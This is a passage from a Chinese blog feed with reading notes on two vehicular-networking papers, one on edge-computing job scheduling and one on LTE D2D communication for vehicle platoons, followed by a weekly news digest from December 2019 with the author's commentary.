消息时，需要估计发送者停留在自己的通信范围内的时间。这个时间指标会应用到计算任务调度的决策环节。</li><li>计算任务调度：当计算任务到达时，调度者立刻开始调度，从而缩短任务的整体完成时间。如果信道或者本地资源目前处于繁忙的状态，那么将计算任务放到相应的队列。调度算法需要在这时确定计算任务在队列中的合适位置。HVC 中调度问题和 AVE 中的调度问题类似，不过具体的目标的函数以及限制要素存在一定的区别。具体的算法内容参见下一个 Subsetion。</li><li>计算卸载：HVC 需要保持计算卸载的可靠性的前提下，进一步减少计算任务的完成时间。因此，在任务卸载到 RSU 或者周围车辆的时候，requester 和 processor 会通过握手协议确定调度的开始时间是否可行<span class="foot-note-span">【原文是 <i>when jobs are offloaded to RSUs or nearby vehicles, handshaking, which exchanges information about the feasibility of scheduled starting time, is used</i>】</span>。当 processor 不可用时，相应的计算任务会被重新调度。</li></ol><h4 id="hvc-的优化算法">HVC 的优化算法</h4><p>在 HVC 中，计算任务到达时调度算法就需要确定每个任务分配的 processor，同时还需要确定计算任务加入队列中的位置。由于任务立刻被调度，故每次需要同时被调度的任务数量相比于 AVE 要少的多。所以我们采用了一个线性复杂度的 online 的算法来求解调度问题。对于每个等待调度的任务，我们知道当前节点可用的 RSU 和邻居车辆的集合。也知道这些节点的处理速率和完成时间，故通过 IEEE 802.11p 协议卸载计算的时间也能估计出来。下图演示了这个过程。</p><p><img src="https://imgs.codewoody.com/uploads/big/d709e7182f7eabc522e8ee49b3d37074.png"></p><p>图中，(a)中 Job 1 到达，调度到最后的可用的时隙上<span class="foot-note-span">【原文对这里解释的不是很充分】</span>。传输时间需要在处理之前。(b) 中，Job 2 到达，调度到 processor B 上，因为 processor A 没有足够的空余计算资源可用。(c) 中，Job 3 到达，被分配到 processor A 上。这种分配可以达到最短的完成时间。<span class="foot-note-span">【这里的最短是指相比于将计算任务分配到 process B 上而言的，原文仍然没有说清楚为什么要先传输 Job 3，后传输 Job 1】</span>。(d) 中，Job 2 被传输出去。(e) 中，握手协议在发送任务前检查目标 processor 的可用性。如果不可用，会重新调度计算任务。在 (f) 中，前一个任务失败之后立刻开始传输下一个任务。</p><blockquote><p>作者接下来聊了一大通关于效用函数 (Utility Function) 的问题，但是聊的很宽泛，也没有给出效用函数的形式（Magazine文章不允许出现太多的公式）。这里就略过了。</p></blockquote><h2 id="性能分析略">性能分析(略)</h2><p>仿真分析略过。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;还是 VTM 的文章。这次是 2019 年最新一年的文章：&lt;a href=&quot;https://ieeexplore.ieee.org/document/8581401&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Mobile Edge Computing For the Internet of Vechicles: Offloading framework and job scheduling&lt;/a&gt;。文章主要关注了车联网场景下的边缘计算问题。这也是时下研究的一个热点方向。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;看完了文章可以来写评论了。这篇文章写的就非常简略了，基本上有营养的就只是提到了边缘计算的 &lt;i&gt;System Model&lt;/i&gt;。对于具体的机制过程缺少详细的介绍。这也是 Magazine 文章的风格吧。要了解车联网边缘面临的重要问题还是得去看 Transaction 的文章吧。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="读论文" scheme="http://www.codewoody.com/categories/%E8%AF%BB%E8%AE%BA%E6%96%87/"/>
    
    
      <category term="读论文" scheme="http://www.codewoody.com/tags/%E8%AF%BB%E8%AE%BA%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>[读论文]自动驾驶编队与LTE D2D通信</title>
    <link href="http://www.codewoody.com/posts/14647/"/>
    <id>http://www.codewoody.com/posts/14647/</id>
    <published>2019-12-11T08:03:23.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<p>这里选择的文章是 2017 年的文章 <a href="https://ieeexplore.ieee.org/document/7829297" target="_blank" rel="noopener">Better Platooning Control Toward Autonomous Driving: An LTE Device-To-Device Communications Strategy That Meets Ultralow Latency Requirements</a>。文章来自 <a href="http://www.ieeevtc.org/vtmagazine/" target="_blank" rel="noopener">Vehicular Technology Magazine</a> 杂志。这个杂志的影响因子挺高的。从标题来看，作者关注的是 LTE D2D 通信无人驾驶编队的控制问题中的应用。D2D 通信是 5G 引入的一个非常重要的特性。可以说对于物联网应用来说，D2D 能力比起带宽和延时来说更为重要。不过舆论对于这个问题的关注不多。这篇文章是一篇 Magazine，一般 Magazine 文章关注的都是研究趋势，而不是关注特别细节的技术问题。因此仔细阅读这篇文章，可以帮助我们了解车联网 + 5G 研究的一些前沿的思路，而不用陷入很多繁冗的细节问题。</p><blockquote><p>看完了文章可以来做一些评论了。最初看这篇文章的目的有两方面，首先是我准备投稿 VTM，因此找来上面的文章看看其风格，而具体而言选择这篇文章，是因为这篇文章涉及的无人驾驶编队问题和 5G D2D 技术都是我比较关心的。</p><p>从文章风格来看，这篇 VTM 还是比较典型的 Magazine 文章风格：即篇幅不长，图片比较多，而几乎没有公式。文章的会有比较大段、详细的研究背景阐述。其提出的协议和机制内容不会特别复杂，也比较少和其他文章的协议进行对比。总结而言，这类文章是选择一个比较新的研究背景，在充分介绍背景问题的基础上，提出一些非常简单的机制，具有 Tutorial 的性质。</p><p>就这篇文章的内容来说，其提出的通信架构其实是非常简单的，模型也非常简单。可见，要写这类 Magazine 文章，提出什么精巧详尽的协议并不是最重要的。最重要的还是要找到非常好的研究场景。</p></blockquote><a id="more"></a><hr><h2 id="研究背景">研究背景</h2><p>编队技术是全面实现自动驾驶的第一步，也是 5G 应用的一个非常重要的场景。在编队系统中，编队成员的间距和速度通过自动化系统来进行控制，这种控制的效率和可靠性建立在车间通信的效率（带宽和延时，尤其是延时）和可靠性之上。在这篇文章中我们主要讨论 5G 技术在车辆编队系统中数据分发的应用潜力。文章提出的通信机制可以实现编队通信的超低延迟需求。文章提出的机制的另一个优势是可以实现对 LTE 资源的空间复用。</p><p>这里文章主要的想法是使用直接的 D2D 通信来实现车间通信的低延时。在 3GPP (Third Geenration Partnership Project) 中，基于蜂窝网基础设施的 D2D 通信服务被称为 Proximity Services (ProSe)。目前 LTE 技术在 V2X 通信中的应用已经在一些项目中被提出<span class="foot-note-span">【文章在这里提到的一个名为 <a href="https://metis2020.com/" target="_blank" rel="noopener">METIS</a> 的项目，不过我查看他们的官网，连一个经过认证的 HTTPS 证书都没有，而且最新的消息只到 2015 年，之后就没有更新了】</span>，且目前正在 3GPP 的讨论进程中。</p><p>作者声称在他们的了解中，目前（2017年）还没有针对 LTE-D2D 在编队场景的应用的充分讨论。所以作者提出了一种简单的编队内的基于 D2D 的消息分发策略。这一策略主要采用了下面的概念：</p><ol type="1"><li>我们提出的策略利用了 Platoon Leader 产生消息的周期性来分配 LTE 资源。</li><li>我们利用了编队中车间距离小，所需的传输功率小的特点来实现 LTE 资源在编队成员，编队之间甚至是其他非车辆终端之间的空分复用。</li></ol><h2 id="相关技术">相关技术</h2><h3 id="编队技术">编队技术</h3><p>一个<strong>编队</strong>可以被定义为一组拥有共同的运动模式，保持一定的队形的一组车辆。通常编队内的成员之间有固定的车间距和统一的速度。编队运行的稳定性依赖于车间信息交换的效率和有效性。车辆的控制系统通过这些共享的信息来调整自己的速度和加速度，从而保持编队结构的稳定。</p><p>车间信息同步通过每轮的 Cooperative Awareness Messages (CAMs) 交换来进行。通常信息交换由编队的 Leader (PL) 发起，PL 负责管理所有的编队成员 (PMs)。CAMs 信息交换的周期由 PL 指定，一般是 100 ms 或者更低。</p><p>在设计 CAMs 消息的格式和内容的时候需要考虑编队使用的控制策略。例如，在 Predecessor-following 控制策略中，每个车辆只与其前方的车辆通信以了解前方车辆的相对位置。这种策略会导致控制不稳定性的叠加的问题。最末车辆的抖动可能非常大。这一效应可以通过 Predecessor-leader 策略避免。在这一策略中，每个车辆除了获取前方车辆的相对位置，还需要获取 PL 的位置信息。在 Bidirectional 策略中，每个车辆获取其前后车辆的信息用于自身速度调整。不过这种策略在大规模编队系统中控制误差比较大。</p><p>编队的性能和稳定性也会高度收到车间通信性能的影响。如果通过 IEEE 802.11 （车联网通信的标准） 交换 CAM 信息，由于其底层使用了 CSMA/CA 协议，这一协议缺乏中心化的资源管理机制，因此难以保证延时和通信的可靠性。</p><p>有很多研究针对 IEEE 802.11 提出了改进措施以克服这些问题。在[6]中，一个单独的信道被划分出来用于传输编队信息，从而减少干扰和冲突。不过这种分配方式比较浪费。在[7]中作者提出了一种构筑在 802.11 之上的 TDMA 机制。在[8]中，PL总是以最大的功率 (20 dbm)发送，以覆盖所有的 PM，而每个 PM 以 0 dbm 的功率发送，只需要覆盖其后方的车辆。</p><p>上面这些为 802.11 打上无竞争补丁方式提示我们，也许我们需要的是一个新的，中心化资源管理机制。这是 LTE-D2D 能够提供的。</p><h3 id="lte-d2d">LTE-D2D</h3><p>在 LTE 系统中，通信资源是由基站直接管理的。基站的管理以 1 ms 长的传输单元 (Transmission time interval, TTI)进行。在每个 TTI 中，基站会分配若干个正交的 180 kHz 的子带 (subband)。每个 TTI 上的一个 子带，被称为一个资源块 (Resource Band, RB)。D2D 通信模式（也被成为 sidelink)，允许设备在不经过基站或者核心网络的情况下直接进行通行。因此 D2D 技术可以让设备之间的通信达到高速率，低延时，低功耗，以及更高的频谱效率。</p><p>D2D 通信可以使用蜂窝网的频段 (InBand)，也可以使用未认证的频段。InBand 通信可以进一步划分为 Underlay 和 Overlay 两个类别。前者蜂窝通信和 D2D 通信共用射频资源；后者 D2D 链接使用专用的射频资源。通过使用合适的资源分配算法，可以减少干扰，并实现 RB 的空分复用。</p><p>在这篇文章中，我们使用 InBand Underlay D2D 通信模式来进行 CAM 信息交换。LTE 的中心化架构可以让我们对于资源的分配状态有一个全局的认识，从而可以优化资源的使用效率。</p><h2 id="系统假设">系统假设</h2><h3 id="编队假设">编队假设</h3><p>假设这样的道路场景，在一个基站 （eNodeB) 的覆盖范围内有 <span class="math inline">\(M \geq 1\)</span> 个编队。这里我们考虑编队系统运行稳态的情形，即不考虑新成员的加入和编队现有成员的离开，这意味着编队的大小 <span class="math inline">\(S_i, i \in {1, \dots, M}\)</span> 是固定的。编队的长度（包括车辆的长度和车间距）为 <span class="math inline">\(L_i\)</span>。相邻车辆的间距为 <span class="math inline">\(d_i\)</span>，运动速度为 <span class="math inline">\(v_i\)</span>。</p><p>假设编队使用了 Predecessor-leader 控制策略。在编队 <span class="math inline">\(i\)</span> 中，信息交换以 CAM 消息的形式进行。PL 每经过 <span class="math inline">\(T_i\)</span> 秒更新一次 CAM。<span class="math inline">\(T_i\)</span> 需要不超过 100ms 的数量级以满足控制算法的需要，即 CAM 更新的频率至少要有 10 Hz。更高的 CAM 更新频率可以允许编队在一定的车间距下以更高的速度安全运行。</p><p>不同的编队可以运行在同一个车道上也可以在相邻的车道上。在前一种情况中，前一个编队的最后一辆车与后一个编队的第一辆车的距离被定义为编队间距离 (<span class="math inline">\(\delta\)</span>)，这个艰巨的典型值为 40m。在后一种情况下编队间的距离可以小的多。</p><p><img src="https://imgs.codewoody.com/uploads/big/b9f02ef62712b7a334b80919e74dbb59.png"></p><h3 id="d2d-假设">D2D 假设</h3><p>CAM 信息交换通过直接的 D2D 链路进行。基站分配给 PL 非独占的 Underlay 模式的上行链路射频资源。网络以时分双工的方式运行 (Time-division duplex, TDD) 。每 10 个 1 ms TTI 称为一个 LTE TDD 帧。上行链路帧，即 U 帧的数量和位置如下表所示。</p><p><img src="https://imgs.codewoody.com/uploads/big/1d32183740422ca11c511746953832f2.png"></p><h3 id="编队对于-lte-资源的需求">编队对于 LTE 资源的需求</h3><p>我们假设一个 CAM 的大小在 50 到 500 字节之间。下图展示了为了成功传输单个的 CAM 包，每个上行帧需要包含的 RB 的数量。图中的水平线还展示了在不同的信道带宽条件下，实际每个上行帧可用的 RB 的数量 <span class="math inline">\(N_{RB}\)</span>。</p><p>例如若一个 CAM 包的大小是 300 字节，那么不到 25 个 RB 就足够了。当带宽是 5 MHz 时，一个上行帧就足够传输一个 CAM 包。但是如果 CAM 包的体积更大一些，一个上行帧就不够用传输 QPSK 调制的 CAM 包了。在文章的接下来的部分我们假设 CAM 包的大小均为 300 字节。</p><figure><img src="https://imgs.codewoody.com/uploads/big/2f382ee3ca793fd692aaed63711bc8f4.png" alt><figcaption>编队占用的 RB 数量与 CAM 包大小的关系</figcaption></figure><h2 id="基于-d2d-的编队-cam-信息分发">基于 D2D 的编队 CAM 信息分发</h2><p>在我们提出的机制中，<strong>只有 PL 会与基站进行交互以获得基站分配给整个编队的通信资源</strong>。传统的资源调度算法一般需要从用户那里获取关于链路质量，缓冲区状态等信息。在编队中，基站需要<strong>额外</strong>的信息，如编队的大小，车辆间距，以及 CAM 消息的大小和发送频率。我们假设 PL 和基站交互使用现有的 LTE 握手过程。然后基站中部署的资源分配算法那负责计算需要分配给编队的资源的数量。具体的资源分配算法是未来工作的内容。由于 CAM 通信的周期性，基站给出的分配方案是「半永久性」(semipersistent) 的，以避免逐 TTI 调度的额外开销。</p><p>资源分配完成以后，在每论更新过程中 CAM 分两阶段在编队内传输：1）在第一阶段，PL 将 CAM 信息传输给所有的 PM；2）在第二阶段，每个 PM 发送其 CAM 给后方的车辆，直到队尾车辆也收到了 CAM 消息。</p><h3 id="第一阶段-pl-to-pms">第一阶段: PL to PMs</h3><p>PL 以足够的高那概率广播以覆盖所有的 PM。如果编队非常长，通信范围 <span class="math inline">\(R\)</span> 只覆盖了编队长度 <span class="math inline">\(L_i = [S_i - 1]d_i\)</span> 的一部分。我们设置 <span class="math inline">\(R \leq 100m\)</span>，如果通信距离太长会产生比较多的干扰。如果 PL 不能覆盖所有的 PM，那么最远处的 PM 要负责进行转发。假设转发节点的通信范围也是 <span class="math inline">\(R\)</span>。PL 发送的 CAM 消息里面包含了每个PM资源分配的信息。这种用 PL 代表整个编队同基站进行交互的架构大大减少了基站的连接负载。</p><h3 id="第二阶段-pm-to-pm">第二阶段: PM to PM</h3><p>当 PM 收到了 PL 的 CAM 消息以后，PM 可以以单播的方式向其后方的 PM 发送相应的 CAM 消息。我们选择的 Predecessor-leader 控制策略允许相邻 PM 节点之间建立短距离，低延时的 D2D 连接。由于单个链路的覆盖范围很短，因此相聚一定距离的 PM 间通信可以同时进行，复用 RB 通信资源。</p><p>为了详细探讨复用的资源的具体规则，我们考虑一个如下图所示的单车道拓扑的情形。</p><p><img src="https://imgs.codewoody.com/uploads/big/5831f8b7bb605963f4d42e80da279c89.png"></p><p>我们定义复用距离 <span class="math inline">\(d_r\)</span> 为能够无干扰地并发传输的链路的距离。我们只考虑距离 RX 端最近的潜在干扰源。用 <span class="math inline">\(d\)</span> 来表示每对 TX/RX 节点的间距。用 <span class="math inline">\(d_I\)</span> 表示最近的潜在干扰源 <span class="math inline">\(I\)</span> 和 RX 之间的距离。显然，<span class="math inline">\(d_r = d_I + d\)</span>。最后，用 <span class="math inline">\(P_{D2D}\)</span> 表示 PM 节点的传输功率。那么在接收端的平均信噪比 (Signal-to-interference-plus-noise, SINR) 为:</p><p><span class="math display">\[\gamma (d, d_I) = \frac{P_{D2D} P L_{D2D}(d)}{P_{D2D} P L_{D2D}(d_I) + N_0},\]</span></p><p>其中 <span class="math inline">\(PL_{D2D}\)</span> 为 D2D 链接的路径损耗，<span class="math inline">\(N_0\)</span> 为背景噪声。这个公式中我们做了 Line-of-sight 传输假设并忽略了多径问题。将 <span class="math inline">\(d_r - d\)</span> 代入上式的 <span class="math inline">\(d_I\)</span>，并让 SINR 值等于预定门限，从而可以计算出 <span class="math inline">\(d_r\)</span>。</p><figure><img src="https://imgs.codewoody.com/uploads/big/dd5a97cd1edc634ea17bedd693b9c20e.png" alt><figcaption><span class="math inline">\(d_r\)</span> 与门限 SINR 的关系</figcaption></figure><p><span class="math inline">\(d_r\)</span> 与门限 SINR 的关系如上图所示。更加鲁棒的调制方式允许更低的 <span class="math inline">\(\gamma_{D2D}\)</span>，因此可以缩小 <span class="math inline">\(d_r\)</span> 的值。这一结果可以用来指导空分复用的设计。空分复用可以在同一编队内部，不同编队之间，以及编队同其他类型的终端之间进行。例如，当 <span class="math inline">\(d = 10m\)</span>，目标 SINR <span class="math inline">\(\gamma_{D2D} = 0 \text{dB}\)</span>，此时复用距离超过 20m。这意味着：</p><ol type="1"><li>编队内：相聚超过 20 m 的 PM 之间可以使用相同的 RB 资源同时进行传输。</li><li>编队间：编队间的距离 <span class="math inline">\(\Delta\)</span> 一般都超过 20 m，因此同一车道上的编队之间可以复用 RB 资源。不过，相邻车道上的编队之间的复用可能会变得困难，因为二者的距离可能小于 20m。</li><li>同其他类型设备：距离编队 20m 以上的其他类型设备可以复用 RB。例如在高速公路场景上，行人的手持设备一般不会靠近道路设施。</li></ol><h2 id="实验验证略">实验验证(略)</h2><p>略，直接看原文。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里选择的文章是 2017 年的文章 &lt;a href=&quot;https://ieeexplore.ieee.org/document/7829297&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Better Platooning Control Toward Autonomous Driving: An LTE Device-To-Device Communications Strategy That Meets Ultralow Latency Requirements&lt;/a&gt;。文章来自 &lt;a href=&quot;http://www.ieeevtc.org/vtmagazine/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Vehicular Technology Magazine&lt;/a&gt; 杂志。这个杂志的影响因子挺高的。从标题来看，作者关注的是 LTE D2D 通信无人驾驶编队的控制问题中的应用。D2D 通信是 5G 引入的一个非常重要的特性。可以说对于物联网应用来说，D2D 能力比起带宽和延时来说更为重要。不过舆论对于这个问题的关注不多。这篇文章是一篇 Magazine，一般 Magazine 文章关注的都是研究趋势，而不是关注特别细节的技术问题。因此仔细阅读这篇文章，可以帮助我们了解车联网 + 5G 研究的一些前沿的思路，而不用陷入很多繁冗的细节问题。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;看完了文章可以来做一些评论了。最初看这篇文章的目的有两方面，首先是我准备投稿 VTM，因此找来上面的文章看看其风格，而具体而言选择这篇文章，是因为这篇文章涉及的无人驾驶编队问题和 5G D2D 技术都是我比较关心的。&lt;/p&gt;
&lt;p&gt;从文章风格来看，这篇 VTM 还是比较典型的 Magazine 文章风格：即篇幅不长，图片比较多，而几乎没有公式。文章的会有比较大段、详细的研究背景阐述。其提出的协议和机制内容不会特别复杂，也比较少和其他文章的协议进行对比。总结而言，这类文章是选择一个比较新的研究背景，在充分介绍背景问题的基础上，提出一些非常简单的机制，具有 Tutorial 的性质。&lt;/p&gt;
&lt;p&gt;就这篇文章的内容来说，其提出的通信架构其实是非常简单的，模型也非常简单。可见，要写这类 Magazine 文章，提出什么精巧详尽的协议并不是最重要的。最重要的还是要找到非常好的研究场景。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="读论文" scheme="http://www.codewoody.com/categories/%E8%AF%BB%E8%AE%BA%E6%96%87/"/>
    
    
      <category term="科研" scheme="http://www.codewoody.com/tags/%E7%A7%91%E7%A0%94/"/>
    
      <category term="读论文" scheme="http://www.codewoody.com/tags/%E8%AF%BB%E8%AE%BA%E6%96%87/"/>
    
      <category term="D2D" scheme="http://www.codewoody.com/tags/D2D/"/>
    
      <category term="5G" scheme="http://www.codewoody.com/tags/5G/"/>
    
      <category term="LTE" scheme="http://www.codewoody.com/tags/LTE/"/>
    
  </entry>
  
  <entry>
    <title>Weekly-25</title>
    <link href="http://www.codewoody.com/posts/53997/"/>
    <id>http://www.codewoody.com/posts/53997/</id>
    <published>2019-12-09T08:44:07.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<h2 id="新闻">新闻</h2><h3 id="中美贸易争端第一阶段协议达成"><a href="https://p.dw.com/p/3Um1G" target="_blank" rel="noopener">中美贸易争端第一阶段协议达成</a></h3><p><img src="https://imgs.codewoody.com/uploads/big/8a010830e663bf6758614846d0920736.jpg"></p><p>中国官方宣布，中美达成"第一阶段经贸协议"。北京时间周五（12月13日）晚间11点左右，中国发改委、商务部和财政部举行联合新闻发布会，公布这一消息。中国官方通讯社新华社也在同一时间发表了"中方关于中美第一阶段经贸协议的声明"。声明中表示，"已就中美第一阶段经贸协议文本达成一致。协议文本包括序言、知识产权、技术转让、食品和农产品、金融服务、汇率和透明度、扩大贸易、双边评估和争端解决、最终条款九个章节"。</p><blockquote class="twitter-tweet"><p lang="en" dir="ltr">We have agreed to a very large Phase One Deal with China. They have agreed to many structural changes and massive purchases of Agricultural Product, Energy, and Manufactured Goods, plus much more. The 25% Tariffs will remain as is, with 7 1/2% put on much of the remainder....</p>— Donald J. Trump (<strong>???</strong>) <a href="https://twitter.com/realDonaldTrump/status/1205509125788098560?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">December 13, 2019</a></blockquote><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>根据路透社的报道，出席新闻发布会的中国发改委官员表示，中方增加对于美国能源、农业、医药、金融服务领域的产品进口，其中中国同意在2020年，<strong>购买价值 500 亿美元的美国农产品</strong>，这相当于贸易战开始前 2017 年的两倍。此外，中方将取消原定周日开始针对美国商品的加税措施。而对于美方对于中国产品加征关税的做法，声明中表示"双方达成一致，美方将履行分阶段取消对华产品加征关税的相关承诺，实现加征关税由升到降的转变。"特朗普的推特中称，“25%的关税仍然维持，其他大部分产品的关税则还是7.5%。……原定12月15日实施的惩罚性关税不会实行”。</p><p>不过，该协议还未得到两国的正式签署。中国称，双方约定，双方将各自尽快完成法律审核、翻译校对等必要的程序，并就正式签署协议的具体安排进行协商。</p><blockquote><p>尽管新闻中提到，协议中包含了知识产权，技术转上，金融服务等等方面，不过这些内容并未成为各方媒体关注的焦点。可以预见这部分的内容是相当格式化的，不会有特别核心的利益交换。事实上现在最为核心的内容还是中方让步购买农产品，美方在关税上做出让步。从这个结果来看，可以说在目前阶段贸易战是高高举起，轻轻落下了。至于后面怎么谈，就不取决于中美之间的关系，而是特朗普的选情了。</p></blockquote><p>更多报道：</p><ul><li><a href="http://www.bbc.com/zhongwen/simp/chinese-news-50787171" target="_blank" rel="noopener">BBC: 中国深夜开记者会宣布与美国达成第一阶段经贸协议</a></li><li><a href="https://www.dw.com/zh/中美贸易争端：第一阶段协议达成！/a-51663438?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">德国之声: 中美贸易争端：第一阶段协议达成！</a></li><li><a href="http://sputniknews.cn/politics/201912131030238293/" target="_blank" rel="noopener">俄罗斯卫星社: 中国财政部副部长：美承诺将取消部分对华拟加征和已加征关税</a></li></ul><h3 id="新疆再教育营学院已全部结业"><a href="http://www.bbc.com/zhongwen/simp/chinese-news-50709538" target="_blank" rel="noopener">新疆再教育营学院已全部结业</a></h3><p>中国新疆官员表示，参加“三学一去”（学习国家通用语言文字、法律知识、职业技能和去极端化）的教培学员已全部结业。</p><p>这个中国称之为再教育营的机构，被西方媒体报道为关押了超过一百万维族人的集中营机构。西方以此抨击中国在新疆的民族政策和宗教政策。</p><h3 id="世界反兴奋剂组织禁止俄罗斯参赛四年"><a href="http://www.bbc.com/zhongwen/simp/world-50714896" target="_blank" rel="noopener">世界反兴奋剂组织禁止俄罗斯参赛四年</a></h3><p>世界反兴奋剂机构（WADA）执委会禁止俄罗斯在未来四年参加大型国际赛事，包括奥运会和世锦赛。执委会认为俄罗斯反兴奋剂机构违反了反兴奋剂规定章程。这项禁令意味着，在未来司年重大国际比赛中，不能升俄罗斯国旗、奏俄罗斯国歌将禁止，其中包括2020年东京奥运会和2022年卡塔尔世界杯足球赛。</p><p>如果俄罗斯运动员能证明自己没有卷入禁药丑闻，俄罗斯运动员将只能以中立身份参赛。俄罗斯政府官员也不能出席此类赛事活动。在4年处罚期内，俄罗斯同样无法主办甚至申办重大国际赛事。</p><p>WADA执委会在瑞士洛桑的会议上一致通过这项决定。</p><h3 id="印度通过公民身份修正法案"><a href="https://www.backchina.com/news/2019/12/12/661044.html" target="_blank" rel="noopener">印度通过公民身份修正法案</a></h3><p>据“今日印度”（India Today）12月9日报道，印度下议院以311票赞成、80票反对，通过“公民身份修正法案”（CAB），提议印度授予，2014年12月31日前因“宗教迫害”而来到印度的巴基斯坦、孟加拉国和阿富汗非法移民国民身份。修正案规定，只有印度教、锡克教、佛教、耆那教、拜火教和天主教徒才有资格摆脱非法移民，获得印度国民的身份；不过，穆斯林教徒并未包括在内。</p><p>不过对于这项印度内政事务，美国政府下属的国际宗教自由委员会不仅称这一法案是“错误方向的危险转向”，还威胁称如果法案在印度两院通过，那么它将建议美国政府制裁印度现任内政部长阿米特·沙阿。</p><h3 id="月-12-日英国大选"><a href="https://www.cnbeta.com/articles/tech/921029.htm" target="_blank" rel="noopener">12 月 12 日英国大选</a></h3><p>英国当地时间早上7点，北京时间12月12日下午3点，英国百年来首次冬季大选投票开启！根据北京时间今天早上6点的出口民调（通常与最终大选结果一致），保守党获得了368个议席，工党仅获得191个议席。<strong>这场被称为“一代人最重要的投票”以保守党的大胜为终结！这将是自1987年玛格丽特•撒切尔获胜以来保守党取得的最佳结果</strong>。</p><p>在替换掉了党内的留欧派议员后，获得巨大胜利的约翰逊面前再无障碍，通过脱欧程序只是时间早晚。如无意外，2020年1月31日前，英国将离开欧盟！消息一出，5分钟后，英镑兑美元汇率上涨2.1%，至1.34美元，这是去年 5 月以来的最高水平。兑欧元汇率也上涨1.7%，为三年半以来的最高值。英国将在明年1月31日前脱离欧盟，从而消除困扰英国企业和经济三年多的英国退欧不确定性。</p><p><img src="https://imgs.codewoody.com/uploads/big/121ab6d1d06c1b87b3adead7d3174801.png"></p><blockquote><p>明年 1 月 31 号是欧盟打击逃税避税的法案 ATAD 最终生效的日子。在王孟源的<a href="http://blog.udn.com/MengyuanWang/129262086" target="_blank" rel="noopener">《【英国】谈Brexit》</a>一文提到。脱欧背后力量的真实动机就是为了避免 ATAD 法案对于英国传统富豪的打击。那么本次英国大选就标志着土豪的胜利了。</p></blockquote><h3 id="英国-nhs-可能被纳入英美经贸谈判"><a href="http://www.jfdaily.com.cn/news/detail?id=192892" target="_blank" rel="noopener">英国 NHS 可能被纳入英美经贸谈判</a></h3><p>英国引以为傲的“英国国家医疗服务体系(NHS)”成了美英经贸谈判桌上的筹码?英国工党领袖不久前拿出一份被“泄露”的英美经贸谈判的秘密文件，指责英国首相、保守党领袖约翰逊将NHS作为英美贸易谈判的筹码。据“今日俄罗斯”(RT)5日报道，约翰逊当天在一档节目中对此否认并形容，科尔宾口中这份被“泄露”的文件就像“UFO的照片”，并非真实存在。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/Q3A6FHEXRZM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h3 id="其他">其他</h3><h4 id="国内">国内</h4><ul><li>北大开除冯仁杰。此前北大教师冯仁杰深陷作风问题丑闻。<a href="http://news.sciencenet.cn/htmlnews/2019/12/433742.shtm" target="_blank" rel="noopener">source</a></li><li>12 月 13 日 11 时 56 分上海嘉里粮油有限公司发生火灾。历时 7 小时大火扑灭，目前无人员伤亡。现场浓烟冲天。<a href="https://www.zhihu.com/question/360766469" target="_blank" rel="noopener">source</a></li><li>密克罗尼西亚联邦总统戴维·帕努埃洛访华。<a href="https://news.ifeng.com/c/7sNWiagOv32" target="_blank" rel="noopener">source</a></li><li>云南孙小果案 19 人一审获刑，其继父获刑 19 年，母亲获刑 20 年。<a href="https://www.zhihu.com/question/361084263/answer/936499162" target="_blank" rel="noopener">source</a></li></ul><h4 id="国际">国际</h4><ul><li>新西兰北岛东岸海域的白岛火山喷发，有数人受伤，另有一些人失踪。<a href="https://cn.reuters.com/article/new-zealand-volcano-eruption-1209-mon-idCNKBS1YD0GL?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a> | 更新，目前已有 5 人死亡，多人下落不明。<a href="http://www.bbc.com/zhongwen/simp/world-50711468" target="_blank" rel="noopener">source</a></li><li>现芬兰交通部长——34岁的桑娜·马林将出任芬兰总理，届时她将成为全球最年轻的总理。<a href="http://sputniknews.cn/society/201912091030192453/" target="_blank" rel="noopener">source</a></li><li>智利空军的一架运输机在前往南极科研考察站的途中失踪。机上载有38人。救援队正在全力寻找幸存者。<a href="https://www.dw.com/zh/智利南极航班失踪-38人命运未卜/a-51608487?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>南太平洋岛国巴布亚新几内亚东部最大的岛屿布干维尔举行全民公投，以压倒性多数投票赞成独立。<a href="http://www.bbc.com/zhongwen/simp/world-50743913" target="_blank" rel="noopener">source</a></li><li>沙特石油公司阿美 (ARAMCO) 首次发股，上市当天股价飙涨 10%。<a href="http://www.bbc.com/zhongwen/simp/business-50744444" target="_blank" rel="noopener">source</a></li><li>瑞典环保少女 Greta Thunberg 周三(11 日)被《时代》杂志评为年度人物。<a href="https://www.dw.com/zh/%E7%91%9E%E5%85%B816%E5%B2%81%E5%B0%91%E5%A5%B3%E9%80%9A%E8%B4%9D%E9%87%8C%E8%8E%B7%E9%80%89%E5%B9%B4%E5%BA%A6%E9%A3%8E%E4%BA%91%E4%BA%BA%E7%89%A9/a-51637434?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>美国国会通过制裁北溪 2 号的协议。这一做法在德国政界和经济界引起不满，被认为是一种威胁手段。<a href="https://www.dw.com/zh/美国威胁制裁北溪-德国政界愤怒/a-51646545?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>德国三大电信商之一 O2 宣布 5G 使用华为。这一消息在美国开始制裁北溪二号的北京之下显得非常的「巧合」。<a 